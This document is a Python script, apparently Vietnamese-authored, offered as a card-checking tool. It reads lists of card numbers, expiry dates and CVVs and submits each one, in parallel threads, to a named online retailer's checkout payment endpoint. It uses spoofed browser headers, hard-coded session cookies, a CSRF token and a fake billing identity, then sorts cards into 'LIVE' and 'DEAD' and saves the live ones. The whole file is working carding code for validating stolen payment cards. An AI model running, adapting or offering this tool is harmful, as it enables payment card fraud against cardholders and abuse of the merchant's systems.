#!/usr/bin/env python3
"""
Credit Card Checker Tool
Kiểm tra thẻ credit card với API pipesandcigars.com
"""

import requests
import time
import json
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple
import urllib.parse


class CardChecker:
    def __init__(self, threads: int = 5, timeout: int = 30):
        """
        Khởi tạo CardChecker
        
        Args:
            threads: Số luồng chạy song song
            timeout: Timeout cho mỗi request (giây)
        """
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        
        # Headers cố định
        self.headers = {
            'accept': '*/*',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-TW;q=0.4,zh;q=0.3',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.pipesandcigars.com',
            'priority': 'u=1, i',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-arch': '"arm"',
            'sec-ch-ua-bitness': '"64"',
            'sec-ch-ua-full-version': '"142.0.7444.60"',
            'sec-ch-ua-full-version-list': '"Chromium";v="142.0.7444.60", "Google Chrome";v="142.0.7444.60", "Not_A Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"macOS"',
            'sec-ch-ua-platform-version': '"15.7.1"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        self.url = 'https://www.pipesandcigars.com/on/demandware.store/Sites-PC-Site/default/CheckoutServices-SubmitPayment'
        
        # Cookies mẫu - có thể cần update
        self.cookies = {
            'gsid': 'sa9QTE71KLqEXRmMmyzQJ0Moy2Cr4LB3DuE0h8SPbW8D-qOXBoxe3sqk8MpHufs0DZpJ-Bq-aN2_UEx0K3cL8A==',
            '_ga': 'GA1.1.2111915286.1751105683',
            '__cq_uuid': 'adylSsMXbwl8aDrmVTJTYxIQwc',
        }
        
        # CSRF token mẫu - có thể cần update
        self.csrf_token = 'H2l2kF4mfUmS8R6PeXb2znnn8wff3ET84HwkF1ocqWRxy2sC_zA5WPXY_sEMuRQAmnNv2QWjRQoVPv6FqQYCbCuKtZXDxEV6kTxOs4jw-Dzmk3RPvABSc6_RDr1cnbl8CELLNl0Uqn4CdQHjHwAN_4mI0kO6pql5bqIFWPOX4UpvYVUEG0U='
        
    def parse_card(self, card_line: str) -> Dict[str, str]:
        """
        Parse thông tin thẻ từ string
        Format: card_number|exp_month|exp_year|cvv
        hoặc: card_number|exp_month/exp_year|cvv
        
        Args:
            card_line: Dòng chứa thông tin thẻ
            
        Returns:
            Dict chứa thông tin thẻ
        """
        card_line = card_line.strip()
        if not card_line or card_line.startswith('#'):
            return None
            
        parts = card_line.split('|')
        if len(parts) < 3:
            return None
            
        card_number = parts[0].strip().replace(' ', '')
        
        # Parse exp date
        if '/' in parts[1]:
            exp_parts = parts[1].split('/')
            exp_month = exp_parts[0].strip()
            exp_year = exp_parts[1].strip()
        else:
            exp_month = parts[1].strip()
            exp_year = parts[2].strip() if len(parts) > 2 else ''
            
        cvv = parts[-1].strip()
        
        # Xác định loại thẻ
        if card_number.startswith('4'):
            card_type = 'Visa'
        elif card_number.startswith('5'):
            card_type = 'Master Card'
        elif card_number.startswith('3'):
            card_type = 'American Express'
        else:
            card_type = 'Unknown'
            
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvv': cvv,
            'type': card_type
        }
    
    def build_payload(self, card: Dict[str, str]) -> str:
        """
        Tạo payload cho request
        
        Args:
            card: Dict chứa thông tin thẻ
            
        Returns:
            Payload string
        """
        data = {
            'dwfrm_billing_addressFields_typeID': 'useShippingAddress',
            'dwfrm_billing_addressFields_addressNickname': 'Michael',
            'dwfrm_billing_addressFields_firstName': 'Michael',
            'dwfrm_billing_addressFields_lastName': 'Johnson',
            'dwfrm_billing_addressFields_companyName': '',
            'dwfrm_billing_addressFields_address1': '350 5th Ave',
            'dwfrm_billing_addressFields_address2': '',
            'dwfrm_billing_addressFields_city': 'New York',
            'dwfrm_billing_addressFields_country': 'US',
            'dwfrm_billing_addressFields_states_stateCode': 'NY',
            'dwfrm_billing_addressFields_isBilling': 'true',
            'dwfrm_billing_addressFields_postalCode': '10118-0100',
            'dwfrm_billing_contactInfoFields_phone': '2175551234',
            'dwfrm_billing_addressFields_phoneNumberExtension': '',
            'dwfrm_billing_addressFields_residentialOrBusiness': 'Residential',
            'csrf_token': self.csrf_token,
            'localizedNewAddressTitle': 'new',
            'dwfrm_billing_paymentMethod': 'CREDIT_CARD',
            'dwfrm_billing_creditCardFields_cardType': card['type'],
            'dwfrm_billing_creditCardFields_cardNumber': card['number'],
            'dwfrm_billing_creditCardFields_expirationMonth': card['exp_month'],
            'dwfrm_billing_creditCardFields_expirationYear': card['exp_year'],
            'dwfrm_billing_creditCardFields_securityCode': card['cvv'],
        }
        
        return urllib.parse.urlencode(data)
    
    def check_card(self, card: Dict[str, str]) -> Tuple[str, str, str]:
        """
        Kiểm tra một thẻ
        
        Args:
            card: Dict chứa thông tin thẻ
            
        Returns:
            Tuple (card_info, status, message)
        """
        card_info = f"{card['number']}|{card['exp_month']}/{card['exp_year']}|{card['cvv']}"
        
        try:
            payload = self.build_payload(card)
            
            response = self.session.post(
                self.url,
                headers=self.headers,
                cookies=self.cookies,
                data=payload,
                timeout=self.timeout
            )
            
            # Phân tích response
            status_code = response.status_code
            
            # Debug: In ra response để xem
            print(f"\n[DEBUG] Status Code: {status_code}")
            print(f"[DEBUG] Response Headers: {dict(response.headers)}")
            print(f"[DEBUG] Response Body (first 500 chars): {response.text[:500]}\n")
            
            if status_code == 200:
                try:
                    json_response = response.json()
                    
                    # Check các trường hợp khác nhau
                    if json_response.get('success') == True:
                        return (card_info, 'LIVE', 'Card is valid')
                    elif 'error' in json_response:
                        error_msg = json_response.get('error', '')
                        if 'declined' in error_msg.lower() or 'invalid' in error_msg.lower():
                            return (card_info, 'DEAD', f'Card declined: {error_msg}')
                        else:
                            return (card_info, 'UNKNOWN', f'Error: {error_msg}')
                    else:
                        # Kiểm tra response text
                        response_text = response.text.lower()
                        if 'success' in response_text or 'approved' in response_text:
                            return (card_info, 'LIVE', 'Card approved')
                        elif 'declined' in response_text or 'invalid' in response_text:
                            return (card_info, 'DEAD', 'Card declined')
                        else:
                            return (card_info, 'UNKNOWN', f'Unknown response: {response.text[:100]}')
                            
                except json.JSONDecodeError:
                    response_text = response.text.lower()
                    if 'success' in response_text or 'approved' in response_text:
                        return (card_info, 'LIVE', 'Card approved')
                    elif 'declined' in response_text or 'invalid' in response_text:
                        return (card_info, 'DEAD', 'Card declined')
                    else:
                        return (card_info, 'UNKNOWN', f'Cannot parse response: {response.text[:100]}')
            else:
                return (card_info, 'ERROR', f'HTTP {status_code}')
                
        except requests.exceptions.Timeout:
            return (card_info, 'ERROR', 'Request timeout')
        except requests.exceptions.RequestException as e:
            return (card_info, 'ERROR', f'Request error: {str(e)}')
        except Exception as e:
            return (card_info, 'ERROR', f'Unknown error: {str(e)}')
    
    def check_cards_from_file(self, input_file: str, output_file: str = None):
        """
        Check danh sách thẻ từ file
        
        Args:
            input_file: File chứa danh sách thẻ
            output_file: File để lưu kết quả (optional)
        """
        print(f"[*] Đọc file: {input_file}")
        
        # Đọc danh sách thẻ
        cards = []
        with open(input_file, 'r') as f:
            for line in f:
                card = self.parse_card(line)
                if card:
                    cards.append(card)
        
        total = len(cards)
        print(f"[*] Tổng số thẻ: {total}")
        print(f"[*] Số luồng: {self.threads}")
        print(f"[*] Bắt đầu check...\n")
        
        # Kết quả
        results = {
            'live': [],
            'dead': [],
            'unknown': [],
            'error': []
        }
        
        checked = 0
        start_time = time.time()
        
        # Check song song
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_card, card): card for card in cards}
            
            for future in as_completed(futures):
                card_info, status, message = future.result()
                checked += 1
                
                # Hiển thị kết quả
                if status == 'LIVE':
                    print(f"[✓] LIVE: {card_info} - {message}")
                    results['live'].append({'card': card_info, 'message': message})
                elif status == 'DEAD':
                    print(f"[✗] DEAD: {card_info} - {message}")
                    results['dead'].append({'card': card_info, 'message': message})
                elif status == 'UNKNOWN':
                    print(f"[?] UNKNOWN: {card_info} - {message}")
                    results['unknown'].append({'card': card_info, 'message': message})
                else:
                    print(f"[!] ERROR: {card_info} - {message}")
                    results['error'].append({'card': card_info, 'message': message})
                
                # Hiển thị tiến độ
                elapsed = time.time() - start_time
                rate = checked / elapsed if elapsed > 0 else 0
                print(f"    Progress: {checked}/{total} ({checked*100//total}%) - Rate: {rate:.2f} cards/s\n")
        
        # Tổng kết
        print("\n" + "="*60)
        print("KẾT QUẢ TỔNG HỢP")
        print("="*60)
        print(f"Tổng số thẻ: {total}")
        print(f"LIVE: {len(results['live'])}")
        print(f"DEAD: {len(results['dead'])}")
        print(f"UNKNOWN: {len(results['unknown'])}")
        print(f"ERROR: {len(results['error'])}")
        print(f"Thời gian: {time.time() - start_time:.2f}s")
        print("="*60)
        
        # Lưu kết quả
        if output_file:
            self.save_results(results, output_file)
            print(f"\n[*] Kết quả đã được lưu vào: {output_file}")
        
        return results
    
    def save_results(self, results: Dict, output_file: str):
        """
        Lưu kết quả vào file
        
        Args:
            results: Dict chứa kết quả
            output_file: File để lưu
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(output_file, 'w') as f:
            f.write(f"# Card Checker Results - {timestamp}\n")
            f.write(f"# Total: {sum(len(v) for v in results.values())}\n\n")
            
            f.write(f"# LIVE CARDS ({len(results['live'])})\n")
            for item in results['live']:
                f.write(f"{item['card']} | {item['message']}\n")
            
            f.write(f"\n# DEAD CARDS ({len(results['dead'])})\n")
            for item in results['dead']:
                f.write(f"{item['card']} | {item['message']}\n")
            
            f.write(f"\n# UNKNOWN ({len(results['unknown'])})\n")
            for item in results['unknown']:
                f.write(f"{item['card']} | {item['message']}\n")
            
            f.write(f"\n# ERRORS ({len(results['error'])})\n")
            for item in results['error']:
                f.write(f"{item['card']} | {item['message']}\n")


def main():
    parser = argparse.ArgumentParser(
        description='Credit Card Checker Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python card_checker.py -i cards.txt
  python card_checker.py -i cards.txt -o results.txt
  python card_checker.py -i cards.txt -o results.txt -t 10
        """
    )
    
    parser.add_argument('-i', '--input', required=True, help='File chứa danh sách thẻ')
    parser.add_argument('-o', '--output', help='File để lưu kết quả')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Số luồng (default: 5)')
    parser.add_argument('--timeout', type=int, default=30, help='Timeout cho mỗi request (default: 30s)')
    
    args = parser.parse_args()
    
    checker = CardChecker(threads=args.threads, timeout=args.timeout)
    checker.check_cards_from_file(args.input, args.output)


if __name__ == '__main__':
    main()
